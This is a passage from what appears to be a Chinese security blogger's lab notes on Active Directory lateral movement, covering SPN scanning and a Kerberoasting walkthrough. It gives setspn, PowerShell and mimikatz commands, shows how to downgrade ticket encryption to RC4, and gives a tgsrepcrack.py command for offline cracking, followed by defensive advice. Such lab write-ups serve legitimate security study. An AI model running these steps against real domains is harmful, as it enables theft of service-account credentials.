+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Discover-PSMSSQLServers.ps1</span><br><span class="line">Discover-PSMSSQLServers</span><br></pre></td></tr></table></figure>
+
+<p>(2)扫描域中所有SPN信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Discover-PSInterestingServices.ps1</span><br><span class="line">Discover-PSInterestingServices</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520144454.png"></p>
+<p>(3) Windows自带工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */*</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520144607.png"></p>
+<h3 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h3><p>Kerberoast是对于Kerberos协议的攻击方法。在需要使用某个资源向TGS发送Kerberos票据时。用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。当TGT验证具有该服务权限时，会向用户发送一张票据。该票据使用与SPN相关的计算机服务的帐号的NTML Hash(RC4_HMAC_MD5).也就是说攻击者通过Kerberoast尝试使用不同的NTLM Hash打开Kerberos票据。如果攻击者使用的NTLM Hash正确，票据会被打开，该NTLM Hash则是对应于该计算机服务张行的密码。</p>
+<p>在域环境中，通过使用Kerberoast使用普通用户的权限在AD中，将计算机服务帐号凭据提取。使用该方法大部分操作离线完成，不会引起报警。通过大多数网络安全策略不够严格(计算机服务密码过期时间未设置， 计算机服务权限过高， 计算机服务帐号和普通用户帐号相同)</p>
+<p>下面通过使用分析Kerberoast攻击流程</p>
+<h3 id="Kerberoast实验"><a href="#Kerberoast实验" class="headerlink" title="Kerberoast实验"></a>Kerberoast实验</h3><p>(1) 手动注册SPN</p>
+<p>使用命令，手动注册MSSQL服务SPN<br><code>setspn -A MSSQLSvc/WIN2008-TEST.hacke.testlab:1433 mssql</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520145659.png"><br>(2) 查看用户对应SPN<br>查看所有SPN<br><code>setspn -T domain -q */*</code><br>查看指定用户SPN<br><code>setspn -L hacke.testlab\win2008-test</code></p>
+<p>(3) 使用 adsiedit.msc 查看用户SPN 和其他高级属性</p>
+<p>(4) 配置指定服务的登录权限</p>
+<p>执行命令，在AD中为用户配置登录服务的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc\Computer COnfiguration\Windows Settings\Security Settins\Local Policies\User Rights Assignment\Log on as a service </span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520150449.png"></p>
+<p>(5)修改加密类型<br>Kerberos协议的加密类型默认为<code>AES256_HMAC</code>，通过tgsrepcrack.py无法破解该加密方式，所以攻击者会通过服务器组策略将加密方式设置为<code>RC4_HMAC_MD5</code> 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc\Computer COnfiguration\Windows Settings\Security Settins\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos </span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520150840.png"></p>
+<p>(6) 请求SPN Kerberos票据</p>
+<p>在 PowerShell中输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/WIN2008-TEST.hacke.testlab&quot;</span><br></pre></td></tr></table></figure>
+<p>生成票据</p>
+<p>(7)导出票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export </span><br></pre></td></tr></table></figure>
+<p>导出票据在当前目录的kirbi文件夹中，加密方式为<code>RC4_HMAC_MD5</code><br>(8)使用 Kerberoast脚本离线破解票据对应帐号的NTLM Hash</p>
+<p>在Kerberoast 中有一个tgsrepcrack.py脚本，可以离线破解NTLM Hash。使用如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt mssql.kirbi</span><br></pre></td></tr></table></figure>
+
+<h3 id="防范建议"><a href="#防范建议" class="headerlink" title="防范建议"></a>防范建议</h3><ul>
+<li>确保密码安全性</li>
+<li>无法修改默认加密方式从 AES 到 RC4</li>
+<li>强制使用AES256加密Kerberos票据</li>
+<li>服务帐号适当配置</li>
+<li>日志审计关注ID为4769(请求Kerberos票据)事件。如果有过多4769行为，应该进一步确认系统是否安全</li>
+</ul>
+<h2 id="Exchange邮件安全"><a href="#Exchange邮件安全" class="headerlink" title="Exchange邮件安全"></a>Exchange邮件安全</h2><p>跳过</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+          
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          
+            <a href="/tags/%E5%9F%9F%E6%A8%AA%E5%90%91/" rel="tag"># 域横向</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B04/" rel="next" title="内网安全攻防笔记4">
+                <i class="fa fa-chevron-left"></i> 内网安全攻防笔记4
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Laplace</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">68</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91"><span class="nav-number">1.</span> <span class="nav-text">域横向</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-%E6%95%A3%E5%88%97%E5%80%BC%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">Windows 散列值分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">1.1.1.</span> <span class="nav-text">单机密码抓取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E7%9A%84%E9%98%B2%E8%8C%83"><span class="nav-number">1.1.2.</span> <span class="nav-text">单机密码的防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Hashcat%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">1.1.3.</span> <span class="nav-text">使用Hashcat获取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%94%BB%E5%87%BB%E8%80%85%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.1.4.</span> <span class="nav-text">防御攻击者抓取明文密码和散列值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">Hash传递攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8NTLM-Hash%E4%BC%A0%E9%80%92"><span class="nav-number">1.2.1.</span> <span class="nav-text">使用NTLM Hash传递</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8AES-256%E8%BD%AC%E9%80%92"><span class="nav-number">1.2.2.</span> <span class="nav-text">使用AES-256转递</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0KB2871977%E5%BD%B1%E5%93%8D"><span class="nav-number">1.2.3.</span> <span class="nav-text">更新KB2871977影响</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92-PTT"><span class="nav-number">1.3.</span> <span class="nav-text">票据传递(PTT)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E8%BF%9B%E8%A1%8CPTT"><span class="nav-number">1.3.1.</span> <span class="nav-text">使用mimikatz进行PTT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8kekeo%E8%BF%9B%E8%A1%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="nav-number">1.3.2.</span> <span class="nav-text">使用kekeo进行票据传递</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PsExec%E4%BD%BF%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">PsExec使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PsTools%E5%B7%A5%E5%85%B7%E5%8C%85%E4%B8%AD%E7%9A%84PsExec"><span class="nav-number">1.4.1.</span> <span class="nav-text">PsTools工具包中的PsExec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%E4%B8%AD%E7%9A%84Psexec%E6%A8%A1%E5%9D%97"><span class="nav-number">1.4.2.</span> <span class="nav-text">MSF中的Psexec模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">1.5.</span> <span class="nav-text">WMI的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-number">1.5.1.</span> <span class="nav-text">基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipmacket%E5%B7%A5%E5%85%B7%E5%8C%85%E4%B8%AD%E7%9A%84wmiexec"><span class="nav-number">1.5.2.</span> <span class="nav-text">ipmacket工具包中的wmiexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmiexec-vbs"><span class="nav-number">1.5.3.</span> <span class="nav-text">wmiexec.vbs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-WmiCommand"><span class="nav-number">1.5.4.</span> <span class="nav-text">Invoke-WmiCommand</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-WMIMethod"><span class="nav-number">1.5.5.</span> <span class="nav-text">Invoke-WMIMethod</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smbexec%E4%BD%BF%E7%94%A8"><span class="nav-number">1.6.</span> <span class="nav-text">smbexec使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#C-%E7%89%88smbexec"><span class="nav-number">1.6.1.</span> <span class="nav-text">C++版smbexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impacket%E4%B8%AD%E7%9A%84smbexec-py"><span class="nav-number">1.6.2.</span> <span class="nav-text">impacket中的smbexec.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E8%B7%A8Windows%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7"><span class="nav-number">1.6.3.</span> <span class="nav-text">Linux跨Windows远程命令执行工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCOM"><span class="nav-number">1.7.</span> <span class="nav-text">DCOM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SPN%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E8%BF%90%E7%94%A8"><span class="nav-number">1.8.</span> <span class="nav-text">SPN在域环境下的运用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SPN%E6%89%AB%E6%8F%8F"><span class="nav-number">1.8.1.</span> <span class="nav-text">SPN扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberoast%E6%94%BB%E5%87%BB"><span class="nav-number">1.8.2.</span> <span class="nav-text">Kerberoast攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberoast%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.8.3.</span> <span class="nav-text">Kerberoast实验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E8%8C%83%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.8.4.</span> <span class="nav-text">防范建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exchange%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="nav-number">1.9.</span> <span class="nav-text">Exchange邮件安全</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Laplace</span>
+
+  
+</div>
+
+<!--
+隐藏下标强力驱动
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+-->
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
